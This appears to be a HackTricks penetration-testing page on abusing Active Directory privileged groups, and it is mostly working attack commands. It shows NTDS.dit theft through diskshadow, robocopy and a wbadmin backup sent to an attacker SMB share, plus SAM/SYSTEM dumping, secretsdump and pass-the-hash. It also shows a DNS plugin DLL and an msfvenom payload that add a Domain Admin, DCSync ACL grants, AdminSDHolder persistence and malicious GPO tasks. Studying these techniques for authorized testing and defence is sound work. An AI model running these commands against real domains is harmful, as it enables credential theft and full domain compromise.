# Privileged Groups

{{#include ../../banners/hacktricks-training.md}}

## Well Known groups with administration privileges

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

This group is empowered to create accounts and groups that are not administrators on the domain. Additionally, it enables local login to the Domain Controller (DC).

To identify the members of this group, the following command is executed:

```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

Adding new users is permitted, as well as local login to the DC.

## AdminSDHolder group

The **AdminSDHolder** group's Access Control List (ACL) is crucial as it sets permissions for all "protected groups" within Active Directory, including high-privilege groups. This mechanism ensures the security of these groups by preventing unauthorized modifications.

An attacker could exploit this by modifying the **AdminSDHolder** group's ACL, granting full permissions to a standard user. This would effectively give that user full control over all protected groups. If this user's permissions are altered or removed, they would be automatically reinstated within an hour due to the system's design.

Recent Windows Server documentation still treats several built-in operator groups as **protected** objects (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, etc.). The **SDProp** process runs on the **PDC Emulator** every 60 minutes by default, stamps `adminCount=1`, and disables inheritance on protected objects. This is useful both for persistence and for hunting stale privileged users that were removed from a protected group but still keep the non-inheriting ACL.

Commands to review the members and modify permissions include:

```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
  Select-Object distinguishedName
```

A script is available to expedite the restoration process: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

For more details, visit [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Membership in this group allows for the reading of deleted Active Directory objects, which can reveal sensitive information:

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

This is useful for **recovering previous privilege paths**. Deleted objects can still expose `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, old SPNs, or the DN of a deleted privileged group that can later be restored by another operator.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
  Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```

### Domain Controller Access

Access to files on the DC is restricted unless the user is part of the `Server Operators` group, which changes the level of access.

### Privilege Escalation

Using `PsService` or `sc` from Sysinternals, one can inspect and modify service permissions. The `Server Operators` group, for instance, has full control over certain services, allowing for the execution of arbitrary commands and privilege escalation:

```cmd
C:\> .\PsService.exe security AppReadiness
```

This command reveals that `Server Operators` have full access, enabling the manipulation of services for elevated privileges.

## Backup Operators

Membership in the `Backup Operators` group provides access to the `DC01` file system due to the `SeBackup` and `SeRestore` privileges. These privileges enable folder traversal, listing, and file copying capabilities, even without explicit permissions, using the `FILE_FLAG_BACKUP_SEMANTICS` flag. Utilizing specific scripts is necessary for this process.

To list group members, execute:

```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

### Local Attack

To leverage these privileges locally, the following steps are employed:

1. Import necessary libraries:

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. Enable and verify `SeBackupPrivilege`:

```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. Access and copy files from restricted directories, for instance:

```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

### AD Attack

Direct access to the Domain Controller's file system allows for the theft of the `NTDS.dit` database, which contains all NTLM hashes for domain users and computers.

#### Using diskshadow.exe

1. Create a shadow copy of the `C` drive:

```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

2. Copy `NTDS.dit` from the shadow copy:

```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

Alternatively, use `robocopy` for file copying:

```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```

3. Extract `SYSTEM` and `SAM` for hash retrieval:

```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

4. Retrieve all hashes from `NTDS.dit`:

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

5. Post-extraction: Pass-the-Hash to DA

```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```

#### Using wbadmin.exe

1. Set up NTFS filesystem for SMB server on attacker machine and cache SMB credentials on the target machine.
2. Use `wbadmin.exe` for system backup and `NTDS.dit` extraction:
   ```cmd
   net use X: \\<AttackIP>\sharename /user:smbuser password
   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
   wbadmin get versions
   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
   ```

For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Members of the **DnsAdmins** group can exploit their privileges to load an arbitrary DLL with SYSTEM privileges on a DNS server, often hosted on Domain Controllers. This capability allows for significant exploitation potential.

To list members of the DnsAdmins group, use:

```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> This vulnerability allows for the execution of arbitrary code with SYSTEM privileges in the DNS service (usually inside the DCs). This issue was fixed in 2021.

Members can make the DNS server load an arbitrary DLL (either locally or from a remote share) using commands such as:

```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

Restarting the DNS service (which may require additional permissions) is necessary for the DLL to be loaded:

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

For more details on this attack vector, refer to ired.team.

#### Mimilib.dll

It's also feasible to use mimilib.dll for command execution, modifying it to execute specific commands or reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.

### WPAD Record for MitM

DnsAdmins can manipulate DNS records to perform Man-in-the-Middle (MitM) attacks by creating a WPAD record after disabling the global query block list. Tools like Responder or Inveigh can be used for spoofing and capturing network traffic.

### Event Log Readers
Members can access event logs, potentially finding sensitive information such as plaintext passwords or command execution details:

```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

## Exchange Windows Permissions

This group can modify DACLs on the domain object, potentially granting DCSync privileges. Techniques for privilege escalation exploiting this group are detailed in Exchange-AD-Privesc GitHub repo.

```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

If you can act as a member of this group, the classic abuse is to grant an attacker-controlled principal the replication rights needed for [DCSync](dcsync.md):

```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```

Historically, **PrivExchange** chained mailbox access, coerced Exchange authentication, and LDAP relay to land on this same primitive. Even where that relay path is mitigated, direct membership in `Exchange Windows Permissions` or control of an Exchange server remains a high-value route to domain replication rights.

## Hyper-V Administrators

Hyper-V Administrators have full access to Hyper-V, which can be exploited to gain control over virtualized Domain Controllers. This includes cloning live DCs and extracting NTLM hashes from the NTDS.dit file.

### Exploitation Example

The practical abuse is usually **offline access to DC disks/checkpoints** rather than old host-level LPE tricks. With access to the Hyper-V host, an operator can checkpoint or export a virtualized Domain Controller, mount the VHDX, and extract `NTDS.dit`, `SYSTEM`, and other secrets without touching LSASS inside the guest:

```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```

From there, reuse the `Backup Operators` workflow to copy `Windows\NTDS\ntds.dit` and the registry hives offline.

## Group Policy Creators Owners	

This group allows members to create Group Policies in the domain. However, its members can't apply group policies to users or group or edit existing GPOs.

The important nuance is that the **creator becomes owner of the new GPO** and usually gets enough rights to edit it afterwards. That means this group is interesting when you can either:

- create a malicious GPO and convince an admin to link it to a target OU/domain
- edit a GPO you created that is already linked somewhere useful
- abuse another delegated right that lets you link GPOs, while this group gives you the edit side

Practical abuse normally means adding an **Immediate Task**, **startup script**, **local admin membership**, or **user rights assignment** change through SYSVOL-backed policy files.

```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```

If editing the GPO manually through `SYSVOL`, remember the change is not enough by itself: `versionNumber`, `GPT.ini`, and sometimes `gPCMachineExtensionNames` must also be updated or clients will ignore the policy refresh.

## Organization Management

In environments where **Microsoft Exchange** is deployed, a special group known as **Organization Management** holds significant capabilities. This group is privileged to **access the mailboxes of all domain users** and maintains **full control over the 'Microsoft Exchange Security Groups'** Organizational Unit (OU). This control includes the **`Exchange Windows Permissions`** group, which can be exploited for privilege escalation.

### Privilege Exploitation and Commands

#### Print Operators

Members of the **Print Operators** group are endowed with several privileges, including the **`SeLoadDriverPrivilege`**, which allows them to **log on locally to a Domain Controller**, shut it down, and manage printers. To exploit these privileges, especially if **`SeLoadDriverPrivilege`** is not visible under an unelevated context, bypassing User Account Control (UAC) is necessary.

To list the members of this group, the following PowerShell command is used:

```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

On Domain Controllers this group is dangerous because the default Domain Controller Policy grants **`SeLoadDriverPrivilege`** to `Print Operators`. If you reach an elevated token for a member of this group, you can enable the privilege and load a signed-but-vulnerable driver to jump to kernel/SYSTEM. For token handling details, check [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

This group's members are granted access to PCs via Remote Desktop Protocol (RDP). To enumerate these members, PowerShell commands are available:

```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```

Further insights into exploiting RDP can be found in dedicated pentesting resources.

#### Remote Management Users

Members can access PCs over **Windows Remote Management (WinRM)**. Enumeration of these members is achieved through:

```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```

For exploitation techniques related to **WinRM**, specific documentation should be consulted.

#### Server Operators

This group has permissions to perform various configurations on Domain Controllers, including backup and restore privileges, changing system time, and shutting down the system. To enumerate the members, the command provided is:

```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

On Domain Controllers, `Server Operators` commonly inherit enough rights to **reconfigure or start/stop services** and also receive `SeBackupPrivilege`/`SeRestorePrivilege` through the default DC policy. In practice, this makes them a bridge between **service-control abuse** and **NTDS extraction**:

```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```

If a service ACL gives this group change/start rights, point the service at an arbitrary command, start it as `LocalSystem`, and then restore the original `binPath`. If service control is locked down, fall back to the `Backup Operators` techniques above to copy `NTDS.dit`.

## References <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
